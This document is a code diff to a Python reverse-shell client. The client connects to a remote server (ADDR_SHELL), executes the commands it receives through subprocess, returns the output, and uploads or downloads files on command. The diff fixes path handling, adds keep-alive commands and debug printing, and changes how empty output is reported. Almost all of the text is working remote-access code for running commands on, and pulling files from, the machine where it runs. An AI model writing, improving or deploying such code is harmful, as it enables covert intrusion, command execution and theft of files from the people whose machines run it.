@@ -24,7 +24,7 @@ def format_size(size: int):
     units = ["B", "KB", "MB", "GB", "TB"]
     while size_fixed > 512 and unit_index < 5:
         unit_index += 1
-        size_fixed = size/1024**unit_index
+        size_fixed = size / 1024 ** unit_index
     return str(round(size_fixed, 2)) + units[unit_index]
 
 
@@ -49,7 +49,7 @@ def send_large_response(msg, conn):
     cursor = 1024
     while buffer:
         conn.send(buffer)
-        buffer = msg[cursor:cursor+1024].encode(FORMAT)
+        buffer = msg[cursor:cursor + 1024].encode(FORMAT)
         cursor += 1024
 
 
@@ -59,7 +59,7 @@ def receive(conn):
     except socket.timeout:
         raise socket.timeout()
     except:
-        raise socket.timeout()
+        raise
     if msg_len == " ": return ""
     if not msg_len: return ""
     msg_len = int(msg_len)
@@ -100,14 +100,14 @@ def send_file(path):
             buffer = f.read(1024)
 
 
-def recv_file(conn):
-    filename = receive(conn)
-    with open("\\".join((os.getcwd(), filename)), "wb") as f:
+def recv_file(conn, filename):
+    path = "/".join((os.getcwd(), filename)) if os.name == "posix" else "\\".join((os.getcwd(), filename))
+    with open(path, "wb") as f:
         recv_buffer = conn.recv(1024)
         while recv_buffer:
             f.write(recv_buffer)
-            recv_buffer = conn.recv(1024)
-        conn.close()
+            try : recv_buffer = conn.recv(1024)
+            except: break
 
 
 def is_still_connected(sock):
@@ -118,23 +118,26 @@ def is_still_connected(sock):
     return True
 
 
+
 def main():
+    i = 1
     while True:
         server_conn = connect(ADDR_SHELL)
-        server_conn.settimeout(5)
+        server_conn.settimeout(10)
         while True:
             command = ""
-            output = "no output"
+            output = ""
             if not is_still_connected(server_conn):
                 break
             try:
                 command = receive(server_conn)
+                print(command)
             except socket.timeout:
                 continue
             if command == "":
                 # this happens if the server is stopped
                 break
-            elif command == "disconnect":
+            elif command in ["disconnect", "echo alive>NULL", "flush"]:
                 continue
             split_command = command.split()
             if command.lower() == "exit":
@@ -143,8 +146,7 @@ def main():
             elif command.lower() == "stop":
                 break
             elif command.lower().strip() == "cd":
-                send(server_conn, os.getcwd())
-                continue
+                output = os.getcwd()
             elif split_command[0].lower() == "cd":
                 # cd command, change directory
                 try:
@@ -155,12 +157,14 @@ def main():
                     output = "directory not found"
             elif split_command[0] == "getfile":
                 send_file(" ".join(split_command[1:]))
-                continue
             elif split_command[0] == "dir":
-                send(server_conn, "\n".join((x + " | " + (format_size(os.path.getsize(x)))*os.path.isfile(x) + "DIR"*(not os.path.isfile(x))) for x in os.listdir(os.getcwd())))
+                output = "\n".join((x + " | " + (format_size(os.path.getsize(x))) * os.path.isfile(x) + "DIR" * (
+                    not os.path.isfile(x))) for x in os.listdir(os.getcwd()))
+            elif split_command[0] == "sendfile":
+                print("Receiving file...")
+                recv_file(server_conn, split_command[-1])
+                print("Done receiving file")
                 continue
-            elif command[0] == "sendfile":
-                recv_file(server_conn)
             elif command == "exit":
                 send(server_conn, DISCONNECT_MESSAGE)
                 exit()
@@ -168,7 +172,12 @@ def main():
             if output == "": output = subprocess.getoutput(command)
             # send the results back to the server
             try:
-                send(server_conn, output)
+                if output != "":
+                    send(server_conn, output)
+                    print(output)
+                else:
+                    i += 1
+                    send(server_conn, f"No comment {i}")
             except:
                 break
         if command == "exit":
